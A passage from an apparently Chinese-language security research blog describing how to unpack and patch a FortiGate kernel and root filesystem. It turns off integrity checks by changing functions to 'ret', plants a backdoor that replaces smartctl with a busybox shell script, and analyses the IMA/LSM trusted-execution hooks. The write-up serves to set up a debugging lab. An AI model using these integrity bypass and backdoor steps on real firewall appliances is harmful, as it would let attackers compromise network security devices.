<span class="keyword">if</span> (len == <span class="number">0</span>)</span><br><span class="line">		len = fill(zbuf, GZIP_IOBUF_SIZE);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* verify the gzip header */</span></span><br><span class="line">	<span class="keyword">if</span> (len &lt; <span class="number">10</span> ||</span><br><span class="line">	   zbuf[<span class="number">0</span>] != <span class="number">0x1f</span> || zbuf[<span class="number">1</span>] != <span class="number">0x8b</span> || zbuf[<span class="number">2</span>] != <span class="number">0x08</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (pos)</span><br><span class="line">			*pos = <span class="number">0</span>;</span><br><span class="line">		error(<span class="string">&quot;Not a gzip file&quot;</span>);</span><br><span class="line">		<span class="keyword">goto</span> gunzip_5;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* skip over gzip header (1f,8b,08... 10 bytes total +</span></span><br><span class="line"><span class="comment">	 * possible asciz filename)</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	strm-&gt;next_in = zbuf + <span class="number">10</span>;</span><br><span class="line">	strm-&gt;avail_in = len - <span class="number">10</span>;</span><br><span class="line">	<span class="comment">/* skip over asciz filename */</span></span><br><span class="line">	<span class="keyword">if</span> (zbuf[<span class="number">3</span>] &amp; <span class="number">0x8</span>) &#123;</span><br><span class="line">		<span class="keyword">do</span> &#123;</span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * If the filename doesn&#x27;t fit into the buffer,</span></span><br><span class="line"><span class="comment">			 * the file is very probably corrupt. Don&#x27;t try</span></span><br><span class="line"><span class="comment">			 * to read more data.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			<span class="keyword">if</span> (strm-&gt;avail_in == <span class="number">0</span>) &#123;</span><br><span class="line">				error(<span class="string">&quot;header error&quot;</span>);</span><br><span class="line">				<span class="keyword">goto</span> gunzip_5;</span><br><span class="line">			&#125;</span><br><span class="line">			--strm-&gt;avail_in;</span><br><span class="line">		&#125; <span class="keyword">while</span> (*strm-&gt;next_in++);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	strm-&gt;next_out = out_buf;</span><br><span class="line">	strm-&gt;avail_out = out_len;</span><br><span class="line"></span><br><span class="line">	rc = zlib_inflateInit2(strm, -MAX_WBITS);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!flush) &#123;</span><br><span class="line">		WS(strm)-&gt;inflate_state.wsize = <span class="number">0</span>;</span><br><span class="line">		WS(strm)-&gt;inflate_state.window = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (rc == Z_OK) &#123;</span><br><span class="line">		<span class="keyword">if</span> (strm-&gt;avail_in == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="comment">/* <span class="doctag">TODO:</span> handle case where both pos and fill are set */</span></span><br><span class="line">			len = fill(zbuf, GZIP_IOBUF_SIZE);</span><br><span class="line">			<span class="keyword">if</span> (len &lt; <span class="number">0</span>) &#123;</span><br><span class="line">				rc = <span class="number">-1</span>;</span><br><span class="line">				error(<span class="string">&quot;read error&quot;</span>);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			strm-&gt;next_in = zbuf;</span><br><span class="line">			strm-&gt;avail_in = len;</span><br><span class="line">		&#125;</span><br><span class="line">		rc = zlib_inflate(strm, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* Write any data generated */</span></span><br><span class="line">		<span class="keyword">if</span> (flush &amp;&amp; strm-&gt;next_out &gt; out_buf) &#123;</span><br><span class="line">			<span class="type">long</span> l = strm-&gt;next_out - out_buf;</span><br><span class="line">			<span class="keyword">if</span> (l != flush(out_buf, l)) &#123;</span><br><span class="line">				rc = <span class="number">-1</span>;</span><br><span class="line">				error(<span class="string">&quot;write error&quot;</span>);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			strm-&gt;next_out = out_buf;</span><br><span class="line">			strm-&gt;avail_out = out_len;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* after Z_FINISH, only Z_STREAM_END is &quot;we unpacked it all&quot; */</span></span><br><span class="line">		<span class="keyword">if</span> (rc == Z_STREAM_END) &#123;</span><br><span class="line">			rc = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (rc != Z_OK) &#123;</span><br><span class="line">			error(<span class="string">&quot;uncompression error&quot;</span>);</span><br><span class="line">			rc = <span class="number">-1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	zlib_inflateEnd(strm);</span><br><span class="line">	<span class="keyword">if</span> (pos)</span><br><span class="line">		<span class="comment">/* add + 8 to skip over trailer */</span></span><br><span class="line">		*pos = strm-&gt;next_in - zbuf+<span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">gunzip_5:</span><br><span class="line">	<span class="built_in">free</span>(strm-&gt;workspace);</span><br><span class="line">gunzip_nomem4:</span><br><span class="line">	<span class="built_in">free</span>(strm);</span><br><span class="line">gunzip_nomem3:</span><br><span class="line">	<span class="keyword">if</span> (!buf)</span><br><span class="line">		<span class="built_in">free</span>(zbuf);</span><br><span class="line">gunzip_nomem2:</span><br><span class="line">	<span class="keyword">if</span> (flush)</span><br><span class="line">		<span class="built_in">free</span>(out_buf);</span><br><span class="line">gunzip_nomem1:</span><br><span class="line">	<span class="keyword">return</span> rc; <span class="comment">/* returns Z_OK (0) if successful */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这说明 vmlinux 使用 gzip 算法压缩，通过 binwalk 也可以验证这一点</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             Microsoft executable, portable (PE)</span><br><span class="line">16820         0x41B4          gzip compressed data, maximum compression, from Unix, last modified: 1970-01-01 00:00:00 (null date)</span><br><span class="line">7381096       0x70A068        Object signature in DER format (PKCS header length: 4, sequence length: 3274</span><br><span class="line">7381235       0x70A0F3        Certificate in DER format (x509 v3), header length: 4, sequence length: 2279</span><br></pre></td></tr></table></figure></div>

<p>从源码看到 extract_kernel 函数在 head_64.S 中被调用</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line"> * Do the extraction, and jump to the new kernel..</span><br><span class="line"> */</span><br><span class="line">	pushq	%rsi			/* Save the real mode argument */</span><br><span class="line">	movq	%rsi, %rdi		/* real mode address */</span><br><span class="line">	leaq	boot_heap(%rip), %rsi	/* malloc area for uncompression */</span><br><span class="line">	leaq	input_data(%rip), %rdx  /* input_data */</span><br><span class="line">	movl	$z_input_len, %ecx	/* input_len */</span><br><span class="line">	movq	%rbp, %r8		/* output target address */</span><br><span class="line">	movq	$z_output_len, %r9	/* decompressed length, end of relocs */</span><br><span class="line">	call	extract_kernel		/* returns kernel location in %rax */</span><br><span class="line">	popq	%rsi</span><br></pre></td></tr></table></figure></div>

<p>在 flatkc 也可以找到对应代码</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">push    rsi</span><br><span class="line">mov     rdi, rsi</span><br><span class="line">lea     rsi, qword_6EC680</span><br><span class="line">lea     rdx, gzip_start</span><br><span class="line">mov     ecx, 6DF3A4h</span><br><span class="line">mov     r8, rbp    /* 0x20000 */</span><br><span class="line">mov     r9, 1A34918h</span><br><span class="line">call    extract_kernel</span><br><span class="line">pop     rsi</span><br><span class="line">jmp     rax</span><br></pre></td></tr></table></figure></div>

<p>根据参数位置，发现 Piggy 的起始地址为 0x41B4，长度为 0x6DF3A4，最终解压得到的 vmlinux 大小应该是 0x1A34918。</p>
<p>所以先将 Piggy 拆出</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=flatkc of=vmlinux.gz ibs=1 skip=$[0x41B4] count=$[0x6DF3A4]</span><br></pre></td></tr></table></figure></div>

<p>查看 Piggy 信息</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">vmlinux.gz: gzip compressed data, max compression, from Unix, original size modulo 2^32 27478296</span><br></pre></td></tr></table></figure></div>

<p>使用 gzip 解压得到 vmlinux</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">gzip -d vmlinux.gz</span><br><span class="line"></span><br><span class="line">vmlinux: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=c1b391e6e7366ccf79173bd1fd93aac1935cf9f6, stripped</span><br></pre></td></tr></table></figure></div>

<p>接下来要对 vmlinux 进行修改，为了方便定位需要修改的地址，可以先使用 vmlinux-to-elf 将 vmlinux 转换为带有符号信息的 ELF 文件，通过逆向定位到 fgt_verify_initrd 函数地址是 0xFFFFFFFF81709689，考虑这个函数只操作了 initramfs_start 和 initramfs_stop 即 rootfs.gz 的数据，我们选择直接将函数第一条指令改为 ret</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.init.text:FFFFFFFF81709689  retn</span><br><span class="line">.init.text:FFFFFFFF8170968A  mov     rbp, rsp</span><br><span class="line">.init.text:FFFFFFFF8170968D  push    r15</span><br><span class="line">.init.text:FFFFFFFF8170968F  push    r14</span><br><span class="line">.init.text:FFFFFFFF81709691  push    r13</span><br></pre></td></tr></table></figure></div>

<p>然后把 Patch 好的 vmlinux 重新压缩回 gzip 格式</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> vmlinux | gzip -9 &gt; vmlinux.gz</span><br></pre></td></tr></table></figure></div>

<p>查看新文档和原文档的大小差异</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-rw-rw-r--  1 admin admin   7205795  3月 15 09:07 vmlinux.gz</span><br><span class="line">-rw-rw-r--  1 admin admin   7205796  3月 15 08:57 vmlinux.gz.ori</span><br></pre></td></tr></table></figure></div>

<p>新的文档比原文档小一个字节，先将新文档覆盖回 flatkc</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=/dev/zero of=flatkc bs=1 seek=$[0x41B4] count=$[0x6DF3A4] conv=notrunc</span><br><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=vmlinux.gz of=flatkc bs=1 seek=$[0x41B4] conv=notrunc</span><br></pre></td></tr></table></figure></div>

<p>由于在 gzip 文件结尾添加多余字符时可能会导致解压失败，所以修改调用 extract_kernel 的汇编代码，将 input_len 修改为实际长度 7205795。</p>
<p>使用 qemu 在本地启动测试</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">qemu-system-x86_64 -serial stdio -M q35 -m 1024 -kernel flatkc</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/fortigate_debug_env2_4.png"
                     
                ></p>
<p>启动之后内核 panic 在 mount_block_root 位置，因为本地模拟不存在 rootfs.gz 文件，所以这应该是正常现象。</p>
<h2 id="植入后门"><a href="#植入后门" class="headerlink" title="植入后门"></a>植入后门</h2><p>内核修改完毕，下面要向系统植入后门。</p>
<p>修改之后的内核理论上已经不会再对 rootfs.gz 执行校验和加密，所以要将虚拟磁盘中被加密的 rootfs.gz 替换为明文版本。解密算法可参考之前的文章， 也可以使用我编写的<a class="link"   href="https://gist.github.com/rrrrrrri/e5b47cb974caae26564f6ab6d0959d01" >小工具<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。需要注意的是生成的 dec.gz 末尾 256 字节是校验数据，要手动将它们去除。</p>
<p>解压 rootfs.gz 得到文件系统，首先要把 &#x2F;bin&#x2F;init 中完整性校验逻辑 Patch 掉，通过逆向分析发现当完整性校验失败时，都会执行 do_halt 函数</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">if</span> ( sub_4557C0() )</span><br><span class="line">  do_halt();</span><br><span class="line"><span class="keyword">if</span> ( system_integrity_check(<span class="number">1LL</span>, <span class="string">&quot;%s()-%d: %s: run_initlevel(SYSINIT)\n\n&quot;</span>) &lt; <span class="number">0</span> )</span><br><span class="line">  do_halt();</span><br><span class="line"><span class="keyword">if</span> ( sub_2BC8AF0(<span class="number">1LL</span>, <span class="string">&quot;%s()-%d: %s: run_initlevel(SYSINIT)\n\n&quot;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  sub_2CC6290();</span><br><span class="line">  <span class="keyword">if</span> ( sub_4543F0(<span class="string">&quot;/bin/fips_self_test&quot;</span>) )</span><br><span class="line">    do_halt();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( sub_455770() )</span><br><span class="line">    do_halt();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure></div>

<p>所以我们直接将 do_halt 的第一条指令改为 ret，跳过这个函数，这样就算校验失败也不会导致系统重启。</p>
<p>然后向系统添加 busybox 和 sh，再将 smartctl 替换成启动 shell 的脚本</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">/bin/busybox sh -i</span><br></pre></td></tr></table></figure></div>

<p>重新打包 rootfs.gz，替换掉原文件。</p>
<h2 id="可信执行"><a href="#可信执行" class="headerlink" title="可信执行"></a>可信执行</h2><p>至此我们已经将内核和文件系统中部分完整性校验绕过，并且无需关心 rootfs.gz 加解密的问题，将内核和 rootfs.gz 替换之后尝试启动</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/fortigate_debug_env2_1.png"
                     
                ></p>
<p>从 log 中看到由于完整性校验失败输出错误信息，但是系统仍然成功启动并进入登录界面。</p>
<p>登录后执行 <code>diagnose hardware smartctl</code> 即可得到 SHELL 权限</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/fortigate_debug_env2_2.png"
                     
                ></p>
<p>当尝试使用 wget 下载新的文件到系统并执行时，系统会重新启动。在官方文档找到了导致这一问题的原因：<a class="link"   href="https://docs.fortinet.com/document/fortigate/7.4.0/new-features/226732/real-time-file-system-integrity-checking" >https://docs.fortinet.com/document/fortigate/7.4.0/new-features/226732/real-time-file-system-integrity-checking<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>新版本添加了实时完整性检查，即可信执行，在系统启动时内核会统计关键文件的 hash 值并存放到内存，当执行程序时内核验证这个程序的 hash 是否和原始值相同，如果不同或不存在，则说明该程序非法，会导致系统直接重启。</p>
<p>不过我们离线添加的 busybox 等程序能够正常执行，因此只需要将想要运行的程序提前添加到磁盘中(bin.tar.xz)，进入系统就能正常使用。例如再向系统添加一个 gdbserver 程序，重新启动后可正常运行。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/fortigate_debug_env2_3.png"
                     
                ></p>
<p>通过阅读官方文档得知，新版本添加的可信执行校验位于内核中，具体来说，开发者利用 Linux 的 IMA(完整性子系统) 实现了一套运行时文件完整性校验。此外还通过 LSM(Linux Security Module) 框架实现了访问控制系统。</p>
<p>逆向分析内核，定位到 <code>forti_security_module_init</code> 函数：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">forti_security_module_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> security_add_hooks(&amp;fortism_func_list, <span class="number">5LL</span>, aFortiSecurityM);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这个函数通过 <code>security_add_hooks</code> 注册 LSM 的 handler，在 <code>fortism_func_list</code> 函数列表中包含 <code>fortism_file_open</code>、<code>fortism_path_link</code>、<code>fortism_path_rename</code>、<code>fortism_kernel_load_data</code>、<code>fortism_sb_mount</code> 五个函数，实现了对文件、符号链接、内核模块、磁盘挂载等操作的访问控制。我们以 <code>fortism_file_open</code> 函数为例简要分析。<code>fortism_file_open</code> 最终会调用 <code>fortism_file_open_part_0</code>：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">fortism_file_open_part_0</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  v8 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  result = d_path(a1 + <span class="number">16</span>, v7, <span class="number">511</span>);</span><br><span class="line">  v2 = result;</span><br><span class="line">  v3 = paths;</span><br><span class="line">  <span class="keyword">if</span> ( result &lt;= <span class="number">0xFFFFFFFFFFFFF000</span>LL )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = <span class="built_in">strlen</span>(*v3);</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(v2, *v3, v4) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( ++v3 == &amp;qword_FFFFFFFF8165F678 )</span><br><span class="line">      &#123;</span><br><span class="line">        result = <span class="number">0LL</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    v5 = paths2;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = <span class="built_in">strlen</span>(*v5);</span><br><span class="line">      result = <span class="built_in">strncmp</span>(v2, *v5, v6);</span><br><span class="line">      <span class="keyword">if</span> ( !result )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( ++v5 == paths )</span><br><span class="line">        <span class="keyword">return</span> fortism_file_open_part_0_cold();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_5:</span><br><span class="line">  <span class="keyword">if</span> ( v8 != __readgsqword(<span class="number">0x28</span>u) )</span><br><span class="line">    JUMPOUT(<span class="number">0xFFFFFFFF8055054F</span>LL);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>此函数会遍历两个全局数组，数组中包含一些路径</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">/migadmin/fortiguard_resources</span><br><span class="line">/node-scripts/report-runner</span><br><span class="line">/node-scripts/logs</span><br><span class="line">/node-scripts/http-config.json</span><br><span class="line">/bin</span><br><span class="line">/migadmin</span><br><span class="line">/node-scripts</span><br><span class="line">/sbin</span><br><span class="line">/tools</span><br><span class="line">/usr</span><br><span class="line">/lib</span><br><span class="line">/lib64</span><br><span class="line">/data/rootfs.gz</span><br><span class="line">/data/datafs.tar.gz</span><br><span class="line">/data/flatkc</span><br></pre></td></tr></table></figure></div>

<p>当传入的参数匹配以上路径时，函数打印失败信息 <code>try to write readonly file(xxx)</code> 并返回负数值。这一点可以在 SHELL 中验证，例如我们尝试在 &#x2F;bin 目录下创建一个 testfile 文件，会出现错误信息</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/fortigate_debug_env2_5.png"
                     
                ></p>
<p>另外内核中又存在 <code>ima_file_mmap</code> 函数：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">ima_file_mmap</span><span class="params">(__int64 file, <span class="type">char</span> prot)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v3[<span class="number">4</span>]; <span class="comment">// [rsp+4h] [rbp-14h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !file || (prot &amp; <span class="number">4</span>) == <span class="number">0</span> )               <span class="comment">// PROT_EXEC</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  security_task_getsecid(__readgsqword(&amp;off_14D80), v3);</span><br><span class="line">  <span class="keyword">return</span> fos_process_appraise_constprop_0(file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>最终调用 <code>fos_process_appraise_constprop_0</code></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">fos_process_appraise_constprop_0</span><span class="params">(<span class="type">unsigned</span> __int64 file)</span></span><br><span class="line">&#123;</span><br><span class="line">  v32 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  inode = *(file + <span class="number">32</span>);</span><br><span class="line">  v2 = integrity_iint_find(inode);</span><br><span class="line">  <span class="keyword">if</span> ( need_ima_check != <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = v2;</span><br><span class="line">    v4 = d_path(file + <span class="number">16</span>, v30, <span class="number">511</span>);</span><br><span class="line">    v5 = v4;</span><br><span class="line">    <span class="keyword">if</span> ( v4 &gt; <span class="number">0xFFFFFFFFFFFFF000</span>LL )</span><br><span class="line">      <span class="keyword">return</span> fos_process_appraise_constprop_0_cold();</span><br><span class="line">    <span class="keyword">if</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      v24 = <span class="number">3</span>;</span><br><span class="line">      v26 = dword_FFFFFFFF8165F6B4;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; ; i = <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          v29[i] = <span class="number">0LL</span>;</span><br><span class="line">          v29[i + <span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">          v29[i + <span class="number">2</span>] = <span class="number">0LL</span>;</span><br><span class="line">          v29[i + <span class="number">3</span>] = <span class="number">0LL</span>;</span><br><span class="line">          i += <span class="number">4</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( i &lt; <span class="number">8</span> );</span><br><span class="line">        result = ima_calc_file_hash(file, &amp;v26);<span class="comment">// 计算文件 hash 值</span></span><br><span class="line">        <span class="keyword">if</span> ( !result )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !--v24 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( result &lt; <span class="number">0</span> )</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v27 = <span class="number">0</span>;</span><br><span class="line">        v28 = <span class="number">0</span>;</span><br><span class="line">        v26 = dword_FFFFFFFF8165F6B4;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(*(v3 + <span class="number">112</span>) + <span class="number">4LL</span>, v29, *(*(v3 + <span class="number">112</span>) + <span class="number">1LL</span>)) )<span class="comment">// 比较 hash 值</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      ima_pr_emerg(<span class="number">3LL</span>, v5);</span><br><span class="line">      fos_print_hash_isra_0(aNew, v29, *(*(v3 + <span class="number">112</span>) + <span class="number">1LL</span>), v12, v13, v14);</span><br><span class="line">      fos_print_hash_isra_0(aOld, (*(v3 + <span class="number">112</span>) + <span class="number">4LL</span>), *(*(v3 + <span class="number">112</span>) + <span class="number">1LL</span>), v15, v16, v17);</span><br><span class="line">      printk(&amp;unk_FFFFFFFF81401B64, *(inode + <span class="number">80</span>), v18, v19, v20, v21);</span><br><span class="line">      time64_to_tm(*(inode + <span class="number">104</span>), <span class="number">0LL</span>, v25);</span><br><span class="line">      v23 = v25[<span class="number">0</span>];</span><br><span class="line">      printk(&amp;unk_FFFFFFFF81401C48, aModifiedTime, v25[<span class="number">6</span>] + <span class="number">1900</span>, v25[<span class="number">4</span>] + <span class="number">1</span>, v25[<span class="number">3</span>], v25[<span class="number">2</span>]);</span><br><span class="line">      logmsg = fos_ima_get_logmsg(<span class="number">3LL</span>);</span><br><span class="line">      (_fgtlog_vf_text_0[<span class="number">0</span>])(<span class="number">36864LL</span>, <span class="number">255LL</span>, <span class="number">255LL</span>, <span class="number">20234LL</span>, <span class="number">0LL</span>, logmsg, v5, v23);</span><br><span class="line">failed:</span><br><span class="line">      msleep(<span class="number">5000LL</span>);</span><br><span class="line">      kernel_restart(<span class="number">0LL</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0xFFFFFFF3</span>LL;</span><br><span class="line">    &#125;</span><br><span class="line">    v8 = off_FFFFFFFF8165F6A0[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(off_FFFFFFFF8165F6A0[<span class="number">0</span>], v4) )  <span class="comment">// /data/lib/libav.so</span></span><br><span class="line">    &#123;</span><br><span class="line">      v8 = off_FFFFFFFF8165F6A8;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(off_FFFFFFFF8165F6A8, v5) )   <span class="comment">// /data/lib/libips.so</span></span><br><span class="line">      &#123;</span><br><span class="line">        ima_pr_emerg(<span class="number">1LL</span>, v5);</span><br><span class="line">        v9 = <span class="number">1LL</span>;</span><br><span class="line">failed2:</span><br><span class="line">        v10 = fos_ima_get_logmsg(v9);</span><br><span class="line">        (_fgtlog_vf_text_0[<span class="number">0</span>])(<span class="number">36864LL</span>, <span class="number">255LL</span>, <span class="number">255LL</span>, <span class="number">20233LL</span>, <span class="number">0LL</span>, v10, v5);</span><br><span class="line">        <span class="keyword">goto</span> failed;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(v31, <span class="number">0</span>, <span class="keyword">sizeof</span>(v31));</span><br><span class="line">    <span class="built_in">snprintf</span>(v31, <span class="number">511</span>, aSX_0, v8);</span><br><span class="line">    <span class="keyword">if</span> ( fos_verify_pkcs7(file, v5, v31) &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( sys_security_level != <span class="number">2</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( sys_security_level == <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          ima_pr_warning(<span class="number">0</span>);</span><br><span class="line">          v11 = fos_ima_get_logmsg(<span class="number">0LL</span>);</span><br><span class="line">          (_fgtlog_vf_text_0[<span class="number">0</span>])(<span class="number">36864LL</span>, <span class="number">255LL</span>, <span class="number">255LL</span>, <span class="number">20233LL</span>, <span class="number">0LL</span>, v11, v5);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( !sys_security_level )</span><br><span class="line">        &#123;</span><br><span class="line">          ima_pr_warning(<span class="number">0</span>);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      ima_pr_emerg(<span class="number">0LL</span>, v5);</span><br><span class="line">      v9 = <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">goto</span> failed2;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>简单来说，函数会先判断当前是否开启了 IMA 验证，IMA 可以通过修改 <code>/sys/kernel/security/integrity/fos/fix_to_enforce</code> 值来开启或关闭。在 init 程序中也能找到相关代码</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">enforce_fos_integrity</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *v0; <span class="comment">// rax</span></span><br><span class="line">  FILE *v1; <span class="comment">// r12</span></span><br><span class="line"></span><br><span class="line">  v0 = fopen(<span class="string">&quot;/sys/kernel/security/integrity/fos/fix_to_enforce&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v0 )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = v0;</span><br><span class="line">    fputc(<span class="string">&#x27;1&#x27;</span>, v0);</span><br><span class="line">    fclose(v1);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    